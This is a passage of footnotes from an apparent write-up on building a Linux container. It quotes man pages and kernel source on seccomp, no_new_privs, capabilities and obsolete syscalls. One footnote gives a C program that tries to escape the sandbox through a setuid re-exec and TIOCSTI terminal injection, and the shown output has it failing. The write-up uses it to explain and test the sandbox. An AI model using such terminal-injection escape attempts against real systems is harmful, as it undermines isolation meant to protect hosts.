Thanks to Jann Horn for pointing this out.
</p></div></div>

<div class="footdef"><sup><a id="fn.56" class="footnum" href="#fnr.56">56</a></sup> <div class="footpara"><p class="footpara">
<a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/prctl/no_new_privs.txt?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/prctl/no_new_privs.txt@c8d2bc</code></a>
</p>
<blockquote>
<p>
The execve system call can grant a newly-started program privileges
that its parent did not have. The most obvious examples are
setuid/setgid programs and file capabilities. [&#x2026;]  Any task can
set no_new_privs.  Once the bit is set, it is inherited across fork,
clone, and execve and cannot be unset.  With no_new_privs set,
execve promises not to grant the privilege to do anything that could
not have been done without the execve call.
</p>
</blockquote>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 136: </span><a href="http://man7.org/linux/man-pages/man2/seccomp.2.html"><code>man 2 seccomp</code></a></label><pre class="src src-text">		In order to  use the SECCOMP_SET_MODE_FILTER operation,
		either   the  caller   must   have  the   CAP_SYS_ADMIN
		capability in  its user  namespace, or the  thread must
		already have the no_new_privs bit set.  If that bit was
		not  already set  by an  ancestor of  this thread,  the
		thread must make the following call:

		    prctl(PR_SET_NO_NEW_PRIVS, 1);

		Otherwise,  the SECCOMP_SET_MODE_FILTER  operation will
		fail  and return  EACCES  in  errno.  This  requirement
		ensures  that an  unprivileged process  cannot apply  a
		malicious filter and then invoke a set-user-ID or other
		privileged  program using  execve(2), thus  potentially
		compromising  that program.   (Such a  malicious filter
		might, for  example, cause an attempt  to use setuid(2)
		to  set the  caller's user  IDs to  non-zero values  to
		instead  return 0  without actually  making the  system
		call.   Thus,   the  program  might  be   tricked  into
		retaining superuser  privileges in  circumstances where
		it is possible  to influence it to  do dangerous things
		because it did not actually drop privileges.)
</pre>
</div>

<p class="footpara">
It took me a while to internalize this behavior. My impression was
that without <code>PR_SET_NO_NEW_PRIVS</code>, seccomp filters would be dropped
across a <code>setuid</code> exec. This would lead to an easy way to escape
<code>seccomp</code>:
</p>
<ul class="org-ul">
<li>Create a setuid executable that calls some filtered syscall.</li>
<li>Become a non-root user.</li>
<li>Execute that setuid executable.</li>
</ul>

<p class="footpara">
But that's actually not the case. Instead, you just can't set seccomp
filters unless you have one of the following:
</p>
<ul class="org-ul">
<li><code>PR_SET_NO_NEW_PRIVS</code> == 1</li>
<li><code>CAP_SYS_ADMIN</code></li>
</ul>
<p class="footpara">
and so libseccomp sets <code>PR_SET_NO_NEW_PRIVS</code> by default.
</p>

<p class="footpara">
Here's the code I thought would work:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 137: </span><code>setuidd_lower_reexec_and_escape.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static setuidd_lower_reexec_and_escape.c -o setuidd_lower_reexec_and_escape" -*- */
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;

int main (int argc, char **argv)
{
	if (argc == 1) {
		if (setresuid(99, 99, 99)) {
			fprintf(stderr, "++ setresuid failed: %m\n");
			return 1;
		}
		if (execve(argv[0], (char *[]) {argv[0], "-", 0}, NULL)) {
			fprintf(stderr, "++ execve failed: %m\n");
			return 1;
		}
	} else {
		uid_t a, b, c = 0;
		getresuid(&amp;a, &amp;b, &amp;c);
		fprintf(stderr, "++ we're %u/%u/%u.\n", a, b, c);
		if (ioctl(STDIN_FILENO, TIOCSTI, "!")) {
		     fprintf(stderr, "++ ioctl failed: %m\n");
		     return 1;
		}
	}
}
</pre>
</div>

<p class="footpara">
but it doesn't :
</p>

<pre class="example">
[lizzie@empress l-c-i-500-l]$sudo chown root setuidd_lower_reexec_and_escape
[lizzie@empress l-c-i-500-l]$sudo chmod 4007 setuidd_lower_reexec_and_escape
[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./setuidd_lower_reexec_and_escape
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.ZM2vnz...done.
=&gt; trying a user namespace...writing /proc/2095/uid_map...writing
/proc/2095/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.  ++ we're 99/99/99.  ++ ioctl failed:
Operation not permitted
=&gt; cleaning cgroups...done.
</pre>

<p class="footpara">
Here's the code responsible for that check:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 138: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/seccomp.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n340"><code>kernel/seccomp.c:340@c8d2bc</code></a></label><pre class="src src-C">/**
 * seccomp_prepare_filter: Prepares a seccomp filter for use.
 * @fprog: BPF program to install
 *
 * Returns filter on success or an ERR_PTR on failure.
 */
static struct seccomp_filter *seccomp_prepare_filter(struct sock_fprog *fprog)
{
	struct seccomp_filter *sfilter;
	int ret;
	const bool save_orig = IS_ENABLED(CONFIG_CHECKPOINT_RESTORE);

	if (fprog-&gt;len == 0 || fprog-&gt;len &gt; BPF_MAXINSNS)
		return ERR_PTR(-EINVAL);

	BUG_ON(INT_MAX / fprog-&gt;len &lt; sizeof(struct sock_filter));

	/*
	 * Installing a seccomp filter requires that the task has
	 * CAP_SYS_ADMIN in its namespace or be running with no_new_privs.
	 * This avoids scenarios where unprivileged tasks can affect the
	 * behavior of privileged children.
	 */
	if (!task_no_new_privs(current) &amp;&amp;
	    security_capable_noaudit(current_cred(), current_user_ns(),
				     CAP_SYS_ADMIN) != 0)
		return ERR_PTR(-EACCES);

	/* Allocate a new seccomp_filter */
	sfilter = kzalloc(sizeof(*sfilter), GFP_KERNEL | __GFP_NOWARN);
	if (!sfilter)
		return ERR_PTR(-ENOMEM);

	ret = bpf_prog_create_from_user(&amp;sfilter-&gt;prog, fprog,
					seccomp_check_filter, save_orig);
	if (ret &lt; 0) {
		kfree(sfilter);
		return ERR_PTR(ret);
	}

	atomic_set(&amp;sfilter-&gt;usage, 1);

	return sfilter;
}
</pre>
</div>

<p class="footpara">
and the code that unconditionally propagates seccomp filters across exec:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 139: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/fork.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#1268"><code>kernel/fork.c:1268@c8d2bc</code></a></label><pre class="src src-C">static void copy_seccomp(struct task_struct *p)
{
#ifdef CONFIG_SECCOMP
	/*
	 * Must be called with sighand-&gt;lock held, which is common to
	 * all threads in the group. Holding cred_guard_mutex is not
	 * needed because this new task is not yet running and cannot
	 * be racing exec.
	 */
	assert_spin_locked(&amp;current-&gt;sighand-&gt;siglock);

	/* Ref-count the new filter user, and assign it. */
	get_seccomp_filter(current);
	p-&gt;seccomp = current-&gt;seccomp;

	/*
	 * Explicitly enable no_new_privs here in case it got set
	 * between the task_struct being duplicated and holding the
	 * sighand lock. The seccomp state and nnp must be in sync.
	 */
	if (task_no_new_privs(current))
		task_set_no_new_privs(p);

	/*
	 * If the parent gained a seccomp mode after copying thread
	 * flags and between before we held the sighand lock, we have
	 * to manually enable the seccomp thread flag here.
	 */
	if (p-&gt;seccomp.mode != SECCOMP_MODE_DISABLED)
		set_tsk_thread_flag(p, TIF_SECCOMP);
#endif
}
</pre>
</div>

<p class="footpara">
(called by <code>copy_process</code> in <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/fork.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>kernel/fork.c@c8d2bc</code></a>).
</p></div></div>

<div class="footdef"><sup><a id="fn.57" class="footnum" href="#fnr.57">57</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 170: </span><a href="http://man7.org/linux/man-pages/man2/_sysctl.2.html"><code>man 2 _sysctl</code></a></label><pre class="src src-text">NOTES
	Glibc does not provide a  wrapper for this system call; call
	it using  syscall(2).  Or rather...   don't call it:  use of
	this system  call has  long been discouraged,  and it  is so
	unloved that  it is likely  to disappear in a  future kernel
	version.   Since  Linux 2.6.24,  uses  of  this system  call
	result in warnings  in the kernel log.  Remove  it from your
	programs now; use the /proc/sys interface instead.

	This  system  call  is  available only  if  the  kernel  was
	configured with the CONFIG_SYSCTL_SYSCALL option.
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 171: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/init/Kconfig?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1420"><code>init/Kconfig:1420@c8d2bc</code></a></label><pre class="src src-text">config SYSCTL_SYSCALL
	bool "Sysctl syscall support" if EXPERT
	depends on PROC_SYSCTL
	default n
	select SYSCTL
	---help---
	  sys_sysctl uses binary paths that have been found challenging
	  to properly maintain and use.  The interface in /proc/sys
	  using paths with ascii names is now the primary path to this
	  information.

	  Almost nothing using the binary sysctl interface so if you are
	  trying to save some space it is probably safe to disable this,
	  making your kernel marginally smaller.

	  If unsure say N here.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.58" class="footnum" href="#fnr.58">58</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 172: </span><a href="http://man7.org/linux/man-pages/man2/alloc_hugepages.2.html"><code>man 2 alloc_hugepages</code></a></label><pre class="src src-text">DESCRIPTION
	The system calls alloc_hugepages() and free_hugepages() were
	introduced  in Linux  2.5.36  and removed  again in  2.5.54.
	They  existed  only  on  i386  and  ia64  (when  built  with
	CONFIG_HUGETLB_PAGE).  In Linux  2.4.20, the syscall numbers
	exist, but the calls fail with the error ENOSYS.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.59" class="footnum" href="#fnr.59">59</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 173: </span><a href="http://man7.org/linux/man-pages/man2/bdflush.2.html"><code>man 2 bdflush</code></a></label><pre class="src src-text">DESCRIPTION
	Note: Since  Linux 2.6, this  system call is  deprecated and
	does nothing.   It is  likely to  disappear altogether  in a
	future  kernel release.   Nowadays,  the  task performed  by
	bdflush() is handled by the kernel pdflush thread.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.60" class="footnum" href="#fnr.60">60</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 169: </span><a href="http://man7.org/linux/man-pages/man2/create_module.2.html"><code>man 2 create_module</code></a></label><pre class="src src-text">DESCRIPTION
	Note: This  system call  is present  only in  kernels before
	Linux 2.6.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.61" class="footnum" href="#fnr.61">61</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 167: </span><a href="http://man7.org/linux/man-pages/man2/nfsservctl.2.html"><code>man 2 nfsservctl</code></a></label><pre class="src src-text">NAME
	nfsservctl - syscall interface to kernel nfs daemon

SYNOPSIS
	#include &lt;linux/nfsd/syscall.h&gt;

	long nfsservctl(int cmd, struct nfsctl_arg *argp,
				 union nfsctl_res *resp);

DESCRIPTION
	Note: Since  Linux 3.1, this  system call no  longer exists.
	It  has  been  replaced  by  a set  of  files  in  the  nfsd
	filesystem; see nfsd(7).

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.62" class="footnum" href="#fnr.62">62</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 158: </span><a href="http://man7.org/linux/man-pages/man2/syscalls.2.html"><code>man 2 syscalls</code></a></label><pre class="src src-text">	perfctr(2)	2.2	Sparc; removed in 2.6.34
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.63" class="footnum" href="#fnr.63">63</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 146: </span><a href="http://man7.org/linux/man-pages/man2/get_kernel_syms.2.html"><code>man 2 get_kernel_syms</code></a></label><pre class="src src-text">GET_KERNEL_SYMS(2) -- 2016-10-08 -- Linux -- Linux Programmer's Manual

NAME
	get_kernel_syms  -  retrieve   exported  kernel  and  module
	symbols

SYNOPSIS
	#include &lt;linux/module.h&gt;

	int get_kernel_syms(struct kernel_sym *table);

	Note:  No declaration  of this  system call  is provided  in
	glibc headers; see NOTES.

DESCRIPTION
	Note: This  system call  is present  only in  kernels before
	Linux 2.6.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.64" class="footnum" href="#fnr.64">64</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 154: </span><a href="http://man7.org/linux/man-pages/man2/setup.2.html"><code>man 2 setup</code></a></label><pre class="src src-text">SETUP(2) -- 2008-12-03 -- Linux -- Linux Programmer's Manual

NAME
	setup - setup devices and filesystems, mount root filesystem

	[...]

VERSIONS
	Since Linux 2.1.121, no such function exists anymore.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.65" class="footnum" href="#fnr.65">65</a></sup> <div class="footpara"><p class="footpara">
<a href="http://man7.org/linux/man-pages/man2/clock_settime.2.html"><code>man 2 clock_settime</code></a> is unfortunately pretty vague:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 160: </span><a href="http://man7.org/linux/man-pages/man2/clock_settime.2.html"><code>man 2 clock_settime</code></a></label><pre class="src src-text">    CLOCK_GETRES(2) -- 2016-05-09 -- Linux Programmer's Manual

    NAME
            clock_getres, clock_gettime, clock_settime  - clock and time
            functions

            [...]

    ERRORS

            EFAULT
                    tp points outside the accessible address space.

            EINVAL
                    The clk_id specified is not supported on this system.

            EPERM
                    clock_settime()  does not  have permission  to set  the
                    clock indicated.

</pre>
</div>

<p class="footpara">
but you can see in the source that <code>CLOCK_REALTIME</code> is the only clock
with <code>.clock_set</code> and <code>.clock_adj</code> set:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 161: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/time/posix-timers.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n282"><code>kernel/time/posix-timers.c:282@c8d2bc</code></a></label><pre class="src src-C">    /*
     * Initialize everything, well, just everything in Posix clocks/timers ;)
     */
    static __init int init_posix_timers(void)
    {
            struct k_clock clock_realtime = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_clock_realtime_get,
                    .clock_set      = posix_clock_realtime_set,
                    .clock_adj      = posix_clock_realtime_adj,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };
            struct k_clock clock_monotonic = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_ktime_get_ts,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };
            struct k_clock clock_monotonic_raw = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_get_monotonic_raw,
            };
            struct k_clock clock_realtime_coarse = {
                    .clock_getres   = posix_get_coarse_res,
                    .clock_get      = posix_get_realtime_coarse,
            };
            struct k_clock clock_monotonic_coarse = {
                    .clock_getres   = posix_get_coarse_res,
                    .clock_get      = posix_get_monotonic_coarse,
            };
            struct k_clock clock_tai = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_get_tai,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };
            struct k_clock clock_boottime = {
                    .clock_getres   = posix_get_hrtimer_res,
                    .clock_get      = posix_get_boottime,
                    .nsleep         = common_nsleep,
                    .nsleep_restart = hrtimer_nanosleep_restart,
                    .timer_create   = common_timer_create,
                    .timer_set      = common_timer_set,
                    .timer_get      = common_timer_get,
                    .timer_del      = common_timer_del,
            };

            posix_timers_register_clock(CLOCK_REALTIME, &amp;clock_realtime);
            posix_timers_register_clock(CLOCK_MONOTONIC, &amp;clock_monotonic);
            posix_timers_register_clock(CLOCK_MONOTONIC_RAW, &amp;clock_monotonic_raw);
            posix_timers_register_clock(CLOCK_REALTIME_COARSE, &amp;clock_realtime_coarse);
            posix_timers_register_clock(CLOCK_MONOTONIC_COARSE, &amp;clock_monotonic_coarse);
            posix_timers_register_clock(CLOCK_BOOTTIME, &amp;clock_boottime);
            posix_timers_register_clock(CLOCK_TAI, &amp;clock_tai);

            posix_timers_cache = kmem_cache_create("posix_timers_cache",
                                            sizeof (struct k_itimer), 0, SLAB_PANIC,
                                            NULL);
            return 0;
    }

</pre>
</div>

<p class="footpara">
and that those methods go through <code>settimeofday</code> and <code>adjtimex</code>, which
are both also gated by <code>CAP_SYS_TIME</code>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 162: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/time/posix-timers.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n212"><code>kernel/time/posix-timers.c:212@c8d2bc</code></a></label><pre class="src src-C">    /* Set clock_realtime */
    static int posix_clock_realtime_set(const clockid_t which_clock,
                                        const struct timespec *tp)
    {
            return do_sys_settimeofday(tp, NULL);
    }

    static int posix_clock_realtime_adj(const clockid_t which_clock,
                                        struct timex *t)
    {
            return do_adjtimex(t);
    }

</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 163: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/security/commoncap.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n106"><code>security/commoncap.c:106@c8d2bc</code></a></label><pre class="src src-C">    /**
     * cap_settime - Determine whether the current process may set the system clock
     * @ts: The time to set
     * @tz: The timezone to set
     *
     * Determine whether the current process may set the system clock and timezone
     * information, returning 0 if permission granted, -ve if denied.
     */
    int cap_settime(const struct timespec64 *ts, const struct timezone *tz)
    {
            if (!capable(CAP_SYS_TIME))
                    return -EPERM;
            return 0;
    }
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 164: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/time/ntp.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n657"><code>kernel/time/ntp.c:657@c8d2bc</code></a></label><pre class="src src-C">    /**
     * ntp_validate_timex - Ensures the timex is ok for use in do_adjtimex
     */
    int ntp_validate_timex(struct timex *txc)
    {
            if (txc-&gt;modes &amp; ADJ_ADJTIME) {
                    /* singleshot must not be used with any other mode bits */
                    if (!(txc-&gt;modes &amp; ADJ_OFFSET_SINGLESHOT))
                            return -EINVAL;
                    if (!(txc-&gt;modes &amp; ADJ_OFFSET_READONLY) &amp;&amp;
                        !capable(CAP_SYS_TIME))
                            return -EPERM;
            } else {
                    /* In order to modify anything, you gotta be super-user! */
                     if (txc-&gt;modes &amp;&amp; !capable(CAP_SYS_TIME))
                            return -EPERM;
                    /*
                     * if the quartz is off by more than 10% then
                     * something is VERY wrong!
                     */
                    if (txc-&gt;modes &amp; ADJ_TICK &amp;&amp;
                        (txc-&gt;tick &lt;  900000/USER_HZ ||
                         txc-&gt;tick &gt; 1100000/USER_HZ))
                            return -EINVAL;
            }

            /* ... *
    }
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.66" class="footnum" href="#fnr.66">66</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 165: </span><a href="http://man7.org/linux/man-pages/man3/adjtime.3.html"><code>man 3 adjtime</code></a></label><pre class="src src-text">    ADJTIME(3) -- 2016-03-15 -- Linux -- Linux Programmer's Manual

    NAME
            adjtime - correct the time to synchronize the system clock

            [...]

    ERRORS

            EINVAL
                    The adjustment in delta is outside the permitted range.

            EPERM
                    The caller does not have sufficient privilege to adjust
                    the time.  Under Linux,  the CAP_SYS_TIME capability is
                    required.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.67" class="footnum" href="#fnr.67">67</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 159: </span><a href="http://man7.org/linux/man-pages/man2/pciconfig_read.2.html"><code>man 2 pciconfig_read</code></a></label><pre class="src src-text">PCICONFIG_READ(2) -- 2016-07-17 -- Linux -- Linux Programmer's Manual

NAME
	pciconfig_read,  pciconfig_write,   pciconfig_iobase  -  pci
	device information handling
	[...]
ERRORS
	[...]
	EPERM
		User does not have  the CAP_SYS_ADMIN capability.  This
		does not apply to pciconfig_iobase().

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.68" class="footnum" href="#fnr.68">68</a></sup> <div class="footpara"><p class="footpara">
Too many too list, but see <a href="http://man7.org/linux/man-pages/man2/quotactl.2.html"><code>man 2 quotactl</code></a>.
</p></div></div>

<div class="footdef"><sup><a id="fn.69" class="footnum" href="#fnr.69">69</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 143: </span><a href="http://man7.org/linux/man-pages/man2/ustat.2.html"><code>man 2 ustat</code></a></label><pre class="src src-text">    USTAT(2) -- 2003-08-04 -- Linux -- Linux Programmer's Manual

    NAME
            ustat - get filesystem statistics

    SYNOPSIS
            #include &lt;sys/types.h&gt;
            #include &lt;unistd.h&gt;    /* libc[45] */
            #include &lt;ustat.h&gt;     /* glibc2 */

            int ustat(dev_t dev, struct ustat *ubuf);

    DESCRIPTION
            ustat() returns information about a mounted filesystem.  dev
            is a device number identifying a device containing a mounted
            filesystem.  ubuf  is a  pointer to  a ustat  structure that
            contains the following members:

                daddr_t f_tfree;      /* Total free blocks */
                ino_t   f_tinode;     /* Number of free inodes */
                char    f_fname[6];   /* Filsys name */
                char    f_fpack[6];   /* Filsys pack name */

            The  last   two  fields,   f_fname  and  f_fpack,   are  not
            implemented  and  will  always  be filled  with  null  bytes
            ('\0').

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.70" class="footnum" href="#fnr.70">70</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 142: </span><a href="http://man7.org/linux/man-pages/man2/sysfs.2.html"><code>man 2 sysfs</code></a></label><pre class="src src-text">    SYSFS(2) -- 2010-06-27 -- Linux -- Linux Programmer's Manual

    NAME
            sysfs - get filesystem type information

    SYNOPSIS
            int sysfs(int option, const char *fsname);

            int sysfs(int option, unsigned int fs_index, char *buf);

            int sysfs(int option);

    DESCRIPTION
            sysfs()  returns  information  about  the  filesystem  types
            currently present in  the kernel.  The specific  form of the
            sysfs()  call and  the information  returned depends  on the
            option in effect:

            1  Translate the filesystem identifier  string fsname into a
               filesystem type index.

            2  Translate  the  filesystem  type index  fs_index  into  a
               null-terminated   filesystem  identifier   string.   This
               string will be  written to the buffer pointed  to by buf.
               Make sure that buf has enough space to accept the string.

            3  Return  the total  number of  filesystem types  currently
               present in the kernel.

            The  numbering of  the filesystem  type indexes  begins with
            zero.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.71" class="footnum" href="#fnr.71">71</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 150: </span><a href="http://man7.org/linux/man-pages/man2/uselib.2.html"><code>man 2 uselib</code></a></label><pre class="src src-text">USELIB(2) -- 2016-03-15 -- Linux -- Linux Programmer's Manual

NAME
	uselib - load shared library

	[..]

NOTES
	[...]

	Since Linux  3.15, this system  call is available  only when
	the kernel is configured with the CONFIG_USELIB option.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.72" class="footnum" href="#fnr.72">72</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 148: </span><a href="http://man7.org/linux/man-pages/man2/sync_file_range2.2.html"><code>man 2 sync_file_range2</code></a></label><pre class="src src-text">SYNC_FILE_RANGE(2) -- 2014-08-19 -- Linux -- Linux Programmer's Manual

NAME
	sync_file_range - sync a file segment with disk

	[...]
NOTES

   sync_file_range2()
	Some   architectures  (e.g.,   PowerPC,  ARM)   need  64-bit
	arguments to be aligned in a suitable pair of registers.  On
	such architectures, the  call signature of sync_file_range()
	shown in the SYNOPSIS would force a register to be wasted as
	padding  between   the  fd   and  offset   arguments.   (See
	syscall(2)  for  details.)  Therefore,  these  architectures
	define  a different  system call  that orders  the arguments
	suitably:

	    int sync_file_range2(int fd, unsigned int flags,
						off64_t offset, off64_t nbytes);

	The behavior  of this system  call is otherwise  exactly the
	same as sync_file_range().
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.73" class="footnum" href="#fnr.73">73</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 147: </span><a href="http://man7.org/linux/man-pages/man2/readdir.2.html"><code>man 2 readdir</code></a></label><pre class="src src-text">READDIR(2) -- 2013-06-21 -- Linux -- Linux Programmer's Manual

NAME
	readdir - read directory entry

SYNOPSIS

	int readdir(unsigned int fd, struct old_linux_dirent *dirp,
			  unsigned int count);

	Note: There  is no glibc  wrapper for this system  call; see
	NOTES.

DESCRIPTION
	This is  not the  function you are  interested in.   Look at
	readdir(3)  for the  POSIX conforming  C library  interface.
	This page  documents the bare kernel  system call interface,
	which is superseded by getdents(2).

	readdir()  reads  one  old_linux_dirent structure  from  the
	directory referred  to by  the file  descriptor fd  into the
	buffer pointed to  by dirp.  The argument  count is ignored;
	at most one old_linux_dirent structure is read.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.74" class="footnum" href="#fnr.74">74</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 168: </span><a href="http://man7.org/linux/man-pages/man2/kexec_file_load.2.html"><code>man 2 kexec_file_load</code></a></label><pre class="src src-text">NAME
	kexec_load, kexec_file_load  - load  a new kernel  for later
	execution
	[...]
ERRORS
	[...]
	EPERM
		The caller does not have the CAP_SYS_BOOT capability.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.75" class="footnum" href="#fnr.75">75</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 166: </span><a href="http://man7.org/linux/man-pages/man2/nice.2.html"><code>man 2 nice</code></a></label><pre class="src src-text">NICE(2) -- 2016-03-15 -- Linux -- Linux Programmer's Manual

NAME
	nice - change process priority

	[...]
ERRORS

	EPERM
		The calling process attempted  to increase its priority
		by  supplying  a  negative  inc  but  has  insufficient
		privileges.  Under  Linux, the  CAP_SYS_NICE capability
		is   required.   (But   see  the   discussion  of   the
		RLIMIT_NICE resource limit in setrlimit(2).)

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.76" class="footnum" href="#fnr.76">76</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 157: </span><a href="http://man7.org/linux/man-pages/man2/perfmonctl.2.html"><code>man 2 perfmonctl</code></a></label><pre class="src src-text">PERFMONCTL(2) -- 2013-02-13 -- Linux -- Linux Programmer's Manual

NAME
	perfmonctl - interface to IA-64 performance monitoring unit

	[...]

CONFORMING TO
	perfmonctl() is Linux-specific and  is available only on the
	IA-64 architecture.

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.77" class="footnum" href="#fnr.77">77</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 156: </span><a href="http://man7.org/linux/man-pages/man2/syscalls.2.html"><code>man 2 syscalls</code></a></label><pre class="src src-text">	ppc_rtas(2)	2.6.2	PowerPC only
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.78" class="footnum" href="#fnr.78">78</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 152: </span><a href="http://man7.org/linux/man-pages/man2/spu_create.2.html"><code>man 2 spu_create</code></a></label><pre class="src src-text">SPU_CREATE(2) -- 2015-12-28 -- Linux -- Linux Programmer's Manual

NAME
	spu_create - create a new spu context

SYNOPSIS
	#include &lt;sys/types.h&gt;
	#include &lt;sys/spu.h&gt;

	int spu_create(const char *pathname, int flags, mode_t mode);
	int spu_create(const char *pathname, int flags, mode_t mode,
				int neighbor_fd);

	Note: There  is no glibc  wrapper for this system  call; see
	NOTES.

DESCRIPTION
	The  spu_create() system  call is  used on  PowerPC machines
	that  implement the  Cell Broadband  Engine Architecture  in
	order  to access  Synergistic  Processor  Units (SPUs).   It
	creates a  new logical  context for an  SPU in  pathname and
	returns a file descriptor associated with it.  pathname must
	refer to a  nonexistent directory in the mount  point of the
	SPU filesystem  (spufs).  If  spu_create() is  successful, a
	directory is  created at pathname  and it is  populated with
	the files described in spufs(7).

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.79" class="footnum" href="#fnr.79">79</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 153: </span><a href="http://man7.org/linux/man-pages/man2/spu_run.2.html"><code>man 2 spu_run</code></a></label><pre class="src src-text">SPU_RUN(2) -- 2012-08-05 -- Linux -- Linux Programmer's Manual

NAME
